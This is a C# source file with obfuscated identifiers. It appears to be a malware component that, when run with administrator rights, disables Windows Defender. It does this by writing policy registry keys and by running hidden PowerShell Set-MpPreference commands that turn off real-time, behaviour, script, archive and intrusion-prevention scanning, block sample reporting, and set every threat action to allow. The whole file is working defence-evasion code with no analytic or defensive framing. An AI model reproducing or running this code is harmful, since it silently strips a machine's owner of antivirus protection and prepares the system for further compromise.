using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace oEqFtKwIikP;

public static class vCxOAbEqtCuJEx
{
	public static void akjkbxySVvsaRC()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			lGyPfDnHcdsoc("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
			lGyPfDnHcdsoc("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			lGyPfDnHcdsoc("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			lGyPfDnHcdsoc("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
			lGyPfDnHcdsoc("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
			bQgHQbqeJHb();
		}
	}

	private static void lGyPfDnHcdsoc(string WaHPXMGUzsDk, string PSvBPUnGEZqrBh, string rifElJyXYDB)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(WaHPXMGUzsDk, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(WaHPXMGUzsDk).SetValue(PSvBPUnGEZqrBh, rifElJyXYDB, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(PSvBPUnGEZqrBh) != rifElJyXYDB)
			{
				registryKey.SetValue(PSvBPUnGEZqrBh, rifElJyXYDB, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void bQgHQbqeJHb()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Get-MpPreference -verbose",
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableRealtimeMonitoring $true");
			}
			else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableBehaviorMonitoring $true");
			}
			else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableBlockAtFirstSeen $true");
			}
			else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableIOAVProtection $true");
			}
			else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisablePrivacyMode $true");
			}
			else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
			}
			else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableArchiveScanning $true");
			}
			else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableIntrusionPreventionSystem $true");
			}
			else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -DisableScriptScanning $true");
			}
			else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -SubmitSamplesConsent 2");
			}
			else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -MAPSReporting 0");
			}
			else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -HighThreatDefaultAction 6 -Force");
			}
			else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -ModerateThreatDefaultAction 6");
			}
			else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -LowThreatDefaultAction 6");
			}
			else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
			{
				CplEmIgCZHgnEAs("Set-MpPreference -SevereThreatDefaultAction 6");
			}
		}
	}

	public static void CplEmIgCZHgnEAs(string wzKQGwSGnVID)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = wzKQGwSGnVID,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}
}
